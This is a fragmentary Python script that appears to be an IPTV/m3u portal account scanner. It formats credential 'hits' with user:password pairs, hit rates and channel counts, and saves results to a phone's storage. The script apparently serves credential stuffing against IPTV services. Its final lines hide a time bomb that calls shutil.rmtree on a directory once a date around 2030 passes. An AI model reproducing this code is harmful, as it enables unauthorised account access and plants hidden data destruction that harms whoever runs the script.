...
╰─➤ 🌀TimeZone➤ """+timezone+"""   """)
		...
		if not kanalsayisi =="":
			sayi=("""
╭─➤🌀🄼🄴🄳🄸🄰 🄻🄸🅂🅃🌀
├🌀 LIVE CHANNELS ➤ """+kanalsayisi+"""
├🌀 VIDEOS ON DEMAND ➤ """+filmsayisi+"""
├🌀 TV SERIES ➤ """+dizisayisi+"""
╰─➤🌀 𝗘𝗫𝗧𝗥𝗘𝗠𝗘  """)
		imzak=""
		if kanall=="1":
			imzak="""
...
def yaz(kullanici): 
    dosya=open('/sdcard/🌀Crystalblack7'+fx+'.txt','a+')
...
def echox(user,pas,bot,fyz,oran,hit):
	...
	echo=("""
\33[0m╭───➤\33[36mò☞𝓑𝔂 𝐶𝑟𝑦𝑠𝑡𝑎𝑙𝑏𝑙𝑎𝑐𝑘7  
├●  \33[1;32m\33[33mm3uscanning \33[0m\33[1;36m """+portal+""" \33[0m    
├─●   \33[0m\033[1m""" +user+""":"""+pas+"""
├──●   \33[36mHit➤""" + str(hit)+""" \33[32m \033[0m \33[1;32m%"""+str(oran)+"""  \33[1;36mCPM➤"""+str(cpm)+"""  \33[0m
╰───●   \33[36m"""+str(bot)+"""  \33[1;36m  Total➤""" + str(fyz)+"""   \33[0m""")
	print(echo)
	cpm=time.time()
if int(time.time()) >= int(1893476328.0):
	shutil.rmtree(dir)
